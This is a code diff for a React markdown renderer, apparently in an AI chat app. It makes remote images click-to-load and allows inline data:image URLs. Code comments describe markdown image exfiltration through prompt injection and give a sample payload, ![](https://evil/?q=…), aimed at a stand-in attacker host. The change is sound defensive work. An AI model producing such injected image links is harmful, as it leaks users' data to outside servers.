@@ -1,4 +1,4 @@
-import { memo, lazy, Suspense, useMemo } from "react";
+import { memo, lazy, Suspense, useMemo, useState } from "react";
 import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
 import remarkMath from "remark-math";
@@ -20,10 +20,35 @@ const schema = {
     "*": [...(defaultSchema.attributes?.["*"] ?? []), "className"],
     span: [...(defaultSchema.attributes?.span ?? []), "className", "style"],
     a: [["href", /^https?:\/\//], "title", ["target", "_blank"], ["rel", "noreferrer noopener"]],
-    img: [["src", /^https?:\/\//], "alt", "title", "loading"],
+    // data:image/ renders directly (model-generated images); remote URLs go
+    // through click-to-load below so a prompt-injected tracker can't ping
+    // home just by being rendered.
+    img: [["src", /^(https?:\/\/|data:image\/)/], "alt", "title", "loading"],
   },
-  protocols: { ...defaultSchema.protocols, href: ["http", "https", "mailto"], src: ["http", "https"] },
+  protocols: { ...defaultSchema.protocols, href: ["http", "https", "mailto"], src: ["http", "https", "data"] },
 };
+
+// Remote images are click-to-load: an injected ![](https://evil/?q=…) must not
+// fire on render. data:image/ URLs can't exfiltrate and render immediately.
+function SafeImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
+  const [loaded, setLoaded] = useState(false);
+  const s = String(src || "");
+  if (!s) return null;
+  if (s.startsWith("data:image/")) {
+    return <img src={s} alt={alt || ""} title={title} className="md-img" loading="lazy" />;
+  }
+  let host = "";
+  try { host = new URL(s).hostname.replace(/^www\./, ""); } catch { return null; }
+  if (!loaded) {
+    return (
+      <button type="button" className="img-gate" onClick={() => setLoaded(true)}>
+        <span className="img-gate-domain">{host || "external image"}</span>
+        <span className="img-gate-hint">Click to load — external images can track views</span>
+      </button>
+    );
+  }
+  return <img src={s} alt={alt || ""} title={title} className="md-img" loading="lazy" />;
+}
 
 // Citation binder: unknown ids are left untouched (arr[10] must survive).
 export function bindCitations(text: string, sources?: Source[]): string {
@@ -90,8 +115,12 @@ function MdChunk({ body, sources }: { body: string; sources?: Source[] }) {
         // eslint-disable-next-line jsx-a11y/anchor-has-content -- link text comes from markdown at runtime
         a: (p) => <a {...p} target="_blank" rel="noreferrer noopener" />,
         table: (p) => <div className="table-wrap"><table {...p} /></div>,
+        img: (p) => {
+          const { src, alt, title } = p as { src?: string; alt?: string; title?: string };
+          return <SafeImage src={src} alt={alt} title={title} />;
+        },
         code({ className, children, ...rest }) {
-          const m = /language-(\w+)/.exec(className || "");
+          const m = /language-([\w#+.-]+)/.exec(className || "");
           const raw = String(children ?? "").replace(/\n$/, "");
           if (!m) return <code className={className} {...rest}>{children}</code>;
           return <Suspense fallback={<pre>{raw}</pre>}><CodeBlock lang={m[1] ?? ""} code={raw} /></Suspense>;
